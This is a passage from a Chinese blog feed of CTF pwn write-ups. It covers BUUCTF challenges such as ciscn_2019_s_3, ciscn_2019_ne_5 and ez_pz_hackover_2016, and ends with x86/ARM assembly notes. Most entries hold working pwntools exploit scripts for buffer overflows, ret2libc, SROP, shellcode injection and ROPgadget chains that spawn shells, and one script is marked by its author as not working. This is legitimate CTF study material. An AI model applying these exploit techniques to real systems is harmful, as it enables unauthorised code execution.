$0x80：eax存储系统调用号11（0x0b）,int指令调用系统调用</p><p>————————————————<br>版权声明：本文为CSDN博主「hhhnoone」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40712959/article/details/103832987" target="_blank" rel="noopener">https://blog.csdn.net/qq_40712959/article/details/103832987</a></p></blockquote><hr><p>调不出来的如下：</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./ciscn_s_9&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./ciscn_s_9&#39;)        lib = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/robye/Desktop/PWN/libc/32-libc-2.27.so&#39;)    sh.recvuntil(&quot;&gt;\n&quot;)    pop2_ret = 0x080485da    payload = cyclic(36)    payload += p32(elf.plt[&#39;puts&#39;])    payload += p32(0x80484BB)    payload += p32(elf.got[&#39;__libc_start_main&#39;])    #payload += p32(0x8048559)    #payload += p32(0x80484BB)    #pause()    sh.sendline(payload)    sh.recvuntil(&quot;bye~\n&quot;)    __libc_start_main = u32(sh.recv(4))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    sh.recvuntil(&quot;&gt;\n&quot;)    payload = cyclic(36)    #payload += p32(0x08048359)    #payload += p32(0x080485da)#pop_rdi_ebp    payload + p32(0)    #payload += p32(system)    #payload += p32(0xdeadbeef)     #payload += p32(system)    #payload += p32(0)    #payload += p32(0xdeadbeef)    payload += p32(binsh)    #payload += &#39;cat flag&#39;    #payload += p32(0xdeadbeef)    payload += p32(system)    pause()    sh.sendline(payload)    #__free_hook = libc + lib.symbols[&#39;__free_hook&#39;]    #__malloc_hook = libc + lib.symbols[&#39;__malloc_hook&#39;]    #log.success(&quot;libc: &quot; + hex(libc))    #log.success(&quot;system: &quot; + hex(system))    #log.success(&quot;binsh: &quot; + hex(binsh))    #log.success(&quot;__free_hook: &quot; + hex(__free_hook))    #log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,27831,1)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP-ciscn_2019_s_3</title>
    <link href="/2020/01/23/SROP-ciscn_2019_s_3/"/>
    <url>/2020/01/23/SROP-ciscn_2019_s_3/</url>
    
    <content type="html"><![CDATA[<h1 id="SROP-ciscn-2019-s-3-es-7"><a href="#SROP-ciscn-2019-s-3-es-7" class="headerlink" title="SROP-ciscn_2019_s_3/es_7"></a>SROP-ciscn_2019_s_3/es_7</h1><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">比较详细的WP</a></p><p><a href="https://www.jianshu.com/p/ca4a5dacd1a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ca4a5dacd1a2</a></p><blockquote><p>两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。<br>还有一个gadget函数。</p><img src="/2020/01/23/SROP-ciscn_2019_s_3/20191214171639948.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><p>有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。<br>15 sys_rt_sigreturn<br>59 sys_execve</p><p>解法一<br>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。<img src="/2020/01/23/SROP-ciscn_2019_s_3/20191214172422496.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"></p><p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>main=0x0004004ED<br>execv=0x04004E2<br>pop_rdi=0x4005a3<br>pop_rbx_rbp_r12_r13_r14_r15=0x40059A<br>mov_rdxr13_call=0x0400580<br>sys_write=0x00400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280<br>print(hex(sh))</p><p>pl2=’/bin/sh\x00’<em>2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)</em>2+p64(sh+0x50)+p64(0)*3<br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys_write)<br>io.send(pl2)</p><p>io.interactive()</p><p>解法2<br>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。<br>具体可参考：Framing Signals—A Return to Portable Shellcode</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>context.binary=’./pwn’<br>context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p><p>main=0x0004004ED<br>sigret=0x4004DA<br>sys_write=0x400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280 #sh值为binsh所在的位置<br>print(hex(sh))</p><p>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = sh<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sys</p><p>pl1=’a’*16+p64(sigret)+p64(sys_write)+str(frame)</p><p>‘’’<br>def debug(addr):<br>   raw_input(‘debug:’)<br>   gdb.attach(io, “b *” + addr)<br>debug(‘0x400514’)<br>‘’’</p><p>pl2=’/bin/sh\x00’*2+p64(sigret)+p64(sys_write)+str(frame)<br>io.send(pl2)</p><p>io.interactive()<br>————————————————<br>版权声明：本文为CSDN博主「yudhui」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103541178</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_ne_5-骚骚的小东西</title>
    <link href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/"/>
    <url>/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-ne-5-骚骚的小东西"><a href="#ciscn-2019-ne-5-骚骚的小东西" class="headerlink" title="ciscn_2019_ne_5-骚骚的小东西"></a>ciscn_2019_ne_5-骚骚的小东西</h1><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122326853.png" srcset="/img/loading.gif" class="" title="image-20200120122326853"><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122344691.png" srcset="/img/loading.gif" class="" title="image-20200120122344691"><p>输入之后，在调用getflag这里会造成溢出</p><img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122455793.png" srcset="/img/loading.gif" class="" title="image-20200120122455793"><p>函数里调用有system，但没有/bin/sh</p><p>骚东西：<img src="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122604385.png" srcset="/img/loading.gif" class="" title="image-20200120122604385"></p><p>0x80482E6 + 0x4就是 sh</p><p>我们可以system(“sh”)也可以</p><p>exp:</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;#sh = process(&#39;ciscn_2019_ne_5&#39;)sh = remote(&quot;node3.buuoj.cn&quot;,27887)elf = ELF(&quot;./ciscn_2019_ne_5&quot;)lib = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)pop_ret = 0x08048455sh.sendline(&quot;administrator&quot;)system = elf.plt[&#39;system&#39;]binsh = (0x80482E6 + 0x4)sh.sendline(&quot;1&quot;)payload = cyclic(0x48)payload += p32(pop_ret)payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)#pause()sh.sendline(payload)sh.sendline(&quot;4&quot;)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ez_pz_hackover_2016-继续深入学习edb</title>
    <link href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/"/>
    <url>/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-pz-hackover-2016-继续深入学习edb"><a href="#ez-pz-hackover-2016-继续深入学习edb" class="headerlink" title="ez_pz_hackover_2016-继续深入学习edb"></a>ez_pz_hackover_2016-继续深入学习edb</h1><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225637137.png" srcset="/img/loading.gif" class="" title="image-20200118225637137"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225650607.png" srcset="/img/loading.gif" class="" title="image-20200118225650607"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225709949.png" srcset="/img/loading.gif" class="" title="image-20200118225709949"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225720760.png" srcset="/img/loading.gif" class="" title="image-20200118225720760"><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225751402.png" srcset="/img/loading.gif" class="" title="image-20200118225751402"><p>得先绕过result的strcmp</p><pre><code class="python">sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(200)pause()sh.sendline(payload)</code></pre><p>pause时，打开edb并attach ez_pz_hackover_2016</p><p>我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行</p><blockquote><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230956502.png" srcset="/img/loading.gif" class="" title="image-20200118230956502"></blockquote><p>一直运行到不能运行</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230622786.png" srcset="/img/loading.gif" class="" title="image-20200118230622786"><p>计算得偏移为16。</p><p>然后，一开始给出了&amp;s的地址，加上没有打开nx。我们就可以在memcpy，溢出之后，将返回指针指向&amp;s里的shellcode</p><img src="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118231945729.png" srcset="/img/loading.gif" class="" title="image-20200118231945729"><p>一直运行到vuln的ret之后，我们看见了返回地址时0xffb64b7c,然后我们的shellcode在0xffb64b60，所以偏移就是0xffb64b7c-0xffb64b60 = 0x1c </p><p>得exp</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;sh = process(&#39;ez_pz_hackover_2016&#39;)#sh = remote(&quot;node3.buuoj.cn&quot;,27058)elf = ELF(&quot;./ez_pz_hackover_2016&quot;)lib = ELF(&quot;/lib/ld-linux.so.2&quot;)sh.recvuntil(&quot;crash: &quot;)s_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(s_addr - 0x1c)payload += asm(shellcraft.sh())pause()sh.sendline(payload)sh.interactive()</code></pre><p>还有种ret2libc的</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;#sh = process(&#39;ez_pz_hackover_2016&#39;)sh = remote(&quot;node3.buuoj.cn&quot;,29601)elf = ELF(&quot;./ez_pz_hackover_2016&quot;)#lib = ELF(&quot;/lib/ld-linux.so.2&quot;)lib = ELF(&quot;/home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&quot;)chall_addr = 0x8048603sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(elf.plt[&#39;printf&#39;])payload += p32(chall_addr) payload +=  p32(elf.got[&#39;printf&#39;])sh.sendline(payload)sh.recvuntil(&quot;crashme!\n&quot;)printf_addr = u32(sh.recv(4))log.success(&quot;printf_addr ----&gt; &quot; + hex(printf_addr))libc = printf_addr - lib.sym[&#39;printf&#39;]log.success(&quot;libc ----&gt; &quot; + hex(libc))system = lib.sym[&#39;system&#39;] + libcbinsh = lib.search(&quot;/bin/sh\x00&quot;).next() + libcsh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive()</code></pre><p>借鉴:<a href="https://sh1ner.github.io/2019/09/13/buuctf-pwn/#more" target="_blank" rel="noopener">[sh1ner’s blog]</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移</title>
    <link href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>劫持一次流程，覆盖一次ebp</p><p>栈迁移后跳到read</p><p>正常Rop到libc，再rop，再到libc</p><p>rop到libc，由于跳到read上，后面可以继续任意地址跳转</p><p>pop_ret</p><p>leave_ret  </p><p>payload += elf.plt[‘puts’]</p><p>payload += p32(pop_ebp_ret)</p><p>payload += p32(elf.got[“__libc_start”])</p><p>payload += addr</p><p>payload += p32(leave_ret)</p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225539782.png" srcset="/img/loading.gif" alt="image-20200109225539782"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225754002.png" srcset="/img/loading.gif" alt="image-20200109225754002"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225805110.png" srcset="/img/loading.gif" alt="image-20200109225805110"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109231149390.png" srcset="/img/loading.gif" alt="image-20200109231149390"></p><p>没调用函数，函数的got值指向用户代码段，若被执行过会指向libc该函数的</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>常用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget-not_the_same_3dsctf_2016</title>
    <link href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/"/>
    <url>/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPgadget-not-the-same-3dsctf-2016"><a href="#ROPgadget-not-the-same-3dsctf-2016" class="headerlink" title="ROPgadget-not_the_same_3dsctf_2016"></a>ROPgadget-not_the_same_3dsctf_2016</h1><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --ropchain</code></p><p>自动生成</p><pre><code class="python">from struct import packp = &#39;&#39;p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebxp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80</code></pre><p>加上自己算的偏移</p><pre><code class="python">from pwn import *from struct import packelf = ELF(&quot;./not_the_same_3dsctf_2016&quot;)#sh = process(&quot;./not_the_same_3dsctf_2016&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,26066)context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;p = cyclic(0x2D)p += &#39;&#39;p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481ad) # pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x0806fcf1) # pop ecx ; pop ebx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x080eb060) # padding without overwrite ebxp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0807b2af) # inc eax ; retp += pack(&#39;&lt;I&#39;, 0x0806d8a5) # int 0x80sh.sendline(p)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编基础</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="X86汇编基础"><a href="#X86汇编基础" class="headerlink" title="X86汇编基础"></a>X86汇编基础</h2><p>==Intel和AT&amp;T语法区别：==</p><ul><li>Intel<strong>操作数</strong>在<strong>前面</strong>，AT&amp;T的在后面</li></ul><blockquote><p>在Intel语法中：<instruction> <destination operand> <source operand><br>在AT&amp;T语法中：<instruction> <source operand> <destination operand><br>有一个简单的记住它们的方法: 当你面对intel语法的时候，你可以想象把等号(=)放到2个操作数中间，当面对AT&amp;T语法的时候，你可以放一个右箭头(→）到两个操作数之间。</p></blockquote><ul><li>AT&amp;T: 寄存器名之前需要写一个百分号(%)并且在数字前面需要加上美元符($)。并用圆括号替代方括号</li><li>AT&amp;T: 以下是一些添加到操作符后，用来表示数据形式的后缀：<br>– q — quad (64 bits)<br>– l — long (32 bits)<br>– w — word (16 bits)<br>– b — byte (8 bits)</li></ul><hr><p><strong>重要：<code>MOV</code>指令在64位模式下，对低32位进行写入操作的时候，会清空高32位的内容[Int13]。比如 <code>MOV EAX，011223344h</code>将会把值写到RAX里，并且清空RAX的高32位区域。</strong></p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><blockquote><ol><li>EAX： 累加器</li><li>EBX： 基址寄存器</li><li>ECX： 计数器</li><li>EDX： 数据寄存器</li><li>ESI： 源变址寄存器</li><li>EDI： 目的变址寄存器</li><li>EBP： 扩展基址指针寄存器</li><li>ESP： 栈指针寄存器</li><li>EIP： 指令指针寄存器</li></ol><p>大多数寄存器失去了特殊用途，但<strong>ESP</strong>和<strong>EBP</strong>还是有特殊用途</p></blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20190821052642311.png" srcset="/img/loading.gif" class="" title="image-20190821052642311"><h3 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h3><blockquote><p>.data</p><p>Var :</p><p>​        .byte 64 ;  声明一个字节型变量var，对应值为64</p><p>​        .byte 10 ；声明一个数据10，这个数据没有所谓的“标签”，它的内存地址就是 var + 1.</p></blockquote><pre><code>.byte        声明1个字节的数据.short    声明2个字节的数据.long        声明4个字节的数据</code></pre><h4 id="操作后缀"><a href="#操作后缀" class="headerlink" title="操作后缀"></a>操作后缀</h4><pre><code>movb $2,(%ebx);    将2移入到ebx中的值所表示的地址单元中movw $2,(%ebx); 将16位整数2移动到    ebx中的值所表示的地址单元    开始的两个字节中movl $2,(%ebx); 将32位整数2移动到 ebx中的值所表示的地址单元 开始的四个字节中</code></pre><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><h3 id="mov-lt-reg-lt-reg"><a href="#mov-lt-reg-lt-reg" class="headerlink" title="mov &lt;reg, &lt;reg"></a>mov &lt;reg, &lt;reg</h3><blockquote><p>mov默认对寄存器值或变量值进行操作，可以从寄存器到寄存器，从立即数到寄存器，从存储单元到寄存器，从立即数到存储单元，从寄存器到存储单元</p></blockquote><p>将数据从第一个参数（即寄存器中的内容，内存单元中的内容，或者一个参数值）复制到第二个参数（即寄存器或者内存单元）。</p><p>但寄存器复制到寄存器可行时，直接地从内存单元中将数据移动到另一内存单元中是不可以的，必须把内存单元中的数据加载到一个寄存器中，然后才可以通过寄存器把<strong>数据</strong>移动到目标内存单元中。</p><h3 id="push-入栈"><a href="#push-入栈" class="headerlink" title="push 入栈"></a>push 入栈</h3><p>push先将ESP中的值减少4，然后将push 的参数移动到一个32位的地址单元（%esp）.esp地址从高地址到低地址逐渐减少，就像1000到0，先占1000，再999……空间有限</p><h3 id="pop-出栈"><a href="#pop-出栈" class="headerlink" title="pop 出栈"></a>pop 出栈</h3><p>先将内存（%esp）中4个字节的数据放到指定寄存器或者内存单元中，然后让esp+4</p><h3 id="lea-加载有效地址"><a href="#lea-加载有效地址" class="headerlink" title="lea 加载有效地址"></a>lea 加载有效地址</h3><p>将其第一个参数指定的内存单元 放入到 第二个参数指定的寄存器中。只计算有效地址并将其放入寄存器中。</p><h3 id="lea和mov的区别"><a href="#lea和mov的区别" class="headerlink" title="lea和mov的区别"></a>lea和mov的区别</h3><p>mov:</p><ul><li>对于变量，有无[ ] 都是取值</li><li>对于寄存器，无[ ] 表示取值，有[ ] 表示取地址</li></ul><p>Lea:</p><ul><li>对于变量，有无 都是取地址</li><li>对于寄存器，无[ ]表示取地址，有[ ] 表示取值</li></ul><h3 id="imul-整数相乘"><a href="#imul-整数相乘" class="headerlink" title="imul 整数相乘"></a>imul 整数相乘</h3><ul><li>两个参数的：先将两个参数相乘，然后把结果存在第二个参数（必须是一个寄存器）中</li><li>三个参数的：第一个（必须是常数）和第二个参数相乘，存在第三个参数（寄存器中）</li></ul><h3 id="idiv-整数相除"><a href="#idiv-整数相除" class="headerlink" title="idiv 整数相除"></a>idiv 整数相除</h3><p>只有一个操作数，为除数，被除数为EDX：EAX中的内容，商存在EAX中，余数存在EDX</p><h3 id="shl，shr-按位左移或者右移"><a href="#shl，shr-按位左移或者右移" class="headerlink" title="shl，shr 按位左移或者右移"></a>shl，shr 按位左移或者右移</h3><p>对第一个参数进行位运算，移动位数由第二个参数决定</p><hr><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p><code>STMFD SP!, {R4, LR}</code>，这条指令类似x86平台的<code>PUSH</code>指令，它会把2个寄存器（R4和LR）的值写到栈里。不过为了简化，在<code>armcc</code>编译器输出的汇编代码里会写成`PUSH {R4, LR}</p><p>这指令首先会减少<code>SP</code>的值，这样它在栈中指向的空间就被释放，以留给新条目使用，然后将R4和LR的值存入被修改后的<code>SP</code>的储存区域中。</p><p>值得注意的是：<code>STMFD</code>指令是广义的<code>PUSH</code>指令(扩展了它的功能)，因为他能操作任何寄存器，不只是<code>SP</code>。换句话说，<code>STMFD</code>可以用于将一组寄存器储存在特定的内存地址上。</p><p><code>MOV R0， #0</code>这条语句，这条语句就是把0写入R0寄存器。这是因为C函数返回了0，返回值会放在R0里。</p><p>最后一条指令是<code>LDMFD SP!, R4,PC</code>，这是STMFD的逆指令。为了将初始值存入<code>R4</code>和<code>PC</code>寄存器里，这条指令会从栈上(或任何其他的内存区域)读取保存的值，并且增加堆栈指针<code>SP</code>的值。这非常类似x86平台里的<code>POP</code>指令。</p><p>最前面那条<code>STMFD</code>指令，将<code>R4</code>，和<code>LR</code>寄存器成对保存到栈中。在<code>LDMFD</code>执行的时候，<code>R4</code>和<code>PC</code>会被复原。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库复习笔记</title>
